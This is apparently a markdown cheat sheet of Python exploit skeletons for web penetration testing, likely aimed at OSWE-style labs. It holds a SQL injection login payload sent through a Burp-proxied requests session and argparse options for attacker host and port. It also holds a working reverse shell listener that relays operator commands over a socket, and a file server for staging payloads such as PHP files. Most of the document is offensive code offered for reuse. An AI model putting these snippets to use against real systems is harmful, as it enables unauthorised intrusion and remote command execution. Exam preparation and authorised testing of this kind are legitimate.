# Python3 Offensive Scripting
Snippets are skeletons: adapt IPs, paths, payloads, and cookies to your target.

## Logging
```python
import sys
from datetime import datetime
# ...
GREEN = '\033[0;32m'
RED = '\033[0;31m'
GREY = '\033[38;5;244m'
YELLOW = '\033[38;5;226m'
NC = '\033[0m'

class log():
    def _ts():
        return datetime.now().strftime("%H:%M:%S")

    def success(text):
        print(f"[{log._ts()}] [{GREEN}✓{NC}] {GREEN}{text}{NC}")

    def failure(text):
        print(f"[{log._ts()}] [{RED}✘{NC}] {RED}{text}{NC}")
        if args.debug:
            log.debug("Exiting ...")

    def info(text):
        print(f"[{log._ts()}] [{NC}*{NC}] {NC}{text}{NC}")

    def debug(text):
        if args.debug:
            print(f"{GREY}[{log._ts()}] [DEBUG] {GREY}{text}{NC}")
# ...
parser.add_argument('-d', '--debug', action='store_true', default=False, help='Enable debugging output')
```

## Session Setup
```python
import requests
# ...
parser.add_argument("--proxy", help='proxy everything through burp', action='store_true', default=False)
# ...
s = requests.Session()
s.verify = not args.no_verify
s.headers.update({"User-Agent": "Mozilla/5.0"})
if args.proxy:
    s.proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

url = "http://localhost/login.php"
data = { # Example data
    "username": "admin'-- -",
    "password": "anything",
}
cookies = "PHPSESSID=1234"
r = s.post(url, data=data, cookies=cookies, allow_redirects=False)
r = s.get(url, params={"id": 1, "name": "test"}, cookies=cookies)
print (f"Status code: {r.status_code}")
print (f"Response: {r.text}")
```
## Common script arguments
```python
import argparse
# ...
def parse_args():
    global args
    parser = argparse.ArgumentParser(description="OSWE Exploit Skeleton")
    parser.add_argument("-t", "--target",   required=True,  help="Target base URL (e.g. http://192.168.1.10)")
    parser.add_argument("-l", "--lhost",    required=True,  help="Attacker IP for reverse shell")
    parser.add_argument("-p", "--lport",    required=True,  type=int,   help="Attacker port for reverse shell")
    parser.add_argument("-wp", "--wport",    required=False,  default=80, type=int,   help="Attacker port for http server")
    parser.add_argument("--proxy",          action="store_true", default=False,  help="Enable Burp default proxies (8080)")
    parser.add_argument("--no-verify",      action="store_true", default=True,  help="Disable SSL verification")
    parser.add_argument("-d", "--debug",    action="store_true", default=False, help="Debug mode")

    args = parser.parse_args()
    return args
# ...
parse_args()
```

## Reverse shell handler
```python
import socket
import threading
import socketserver
import sys
# ...
def start_listener(host, port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server.bind((host, port))
    except Exception as e:
        print(f"[listener] Failed to bind to {host}:{port}\n\t {e}")
        sys.exit(1)
    
    server.listen(1)
    print(f"[listener] Reverse shell listening on {host}:{port}")

    conn, addr = server.accept()
    print(f"[listener] Connection received from {addr[0]}:{addr[1]}")

    _interact(conn)
    conn.close()
    server.close()

def _interact(conn):
    prompt="[shell] > "
    conn.setblocking(True)
    try:
        while True:
            cmd = input(prompt)
            if not cmd.strip():
                continue
            if cmd.strip().lower() in ("exit", "quit"):
                break

            conn.sendall((cmd + "\n").encode())

            # Read the response. We don't know exactly how much is coming,
            # so read once, then drain any additional buffered data.
            conn.settimeout(0.5)
            output = b""
            try:
                while True:
                    chunk = conn.recv(4096)
                    if not chunk:
                        print("[listener] Connection closed by remote host")
                        return
                    output += chunk
            except socket.timeout:
                pass  # no more data waiting right now
            finally:
                conn.settimeout(None)

            print(output.decode(errors="replace"), end="")

    except (KeyboardInterrupt, EOFError):
        print("[listener] Exiting listener")
        sys.exit(1)
# ...
start_listener("0.0.0.0", 4444)
```

## HTTP Server
```python
import socket
import http.server
import socketserver
import sys
import threading
# ...
def start_file_server(host, port):
    # Files source code
    php_file = b"<?php echo 'Hello World'; ?>"
    txt_file = b"hello world"

    # List <filename>: (<source_code>, <MIME type>) 
    routes = {
        "/file.php": (php_file, "application/octet-stream"),
        "/login": (txt_file, "application/text"),
    }

    class Handler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            if self.path in routes:
                content, content_type = routes[self.path]
                self.send_response(200)
                self.send_header("Content-Type", content_type)
                self.send_header("Content-Length", str(len(content)))
                self.end_headers()
                self.wfile.write(content)
                print(f"[http server] {self.client_address[0]} requested {self.path} -> {YELLOW}Success!{NC}")
            else:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b"404 Not Found")
                print(f"[http server] {self.client_address[0]} requested {self.path} -> {YELLOW}Not Found!{NC}")

        def log_message(self, format, *args):
            # Suppress default noisy logging; we print our own above
            pass

    try:
        server = socketserver.TCPServer((host, port), Handler)
    except Exception as e:
        print(f"[http server] Failed to bind to {host}:{port}\n\t {e}")
        sys.exit(1)

    print(f"[http server] Serving files on {host}:{port}")
    for path in routes:
        print(f"\t    -> {path}")

    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
# ...
start_file_server("0.0.0.0", 80)
```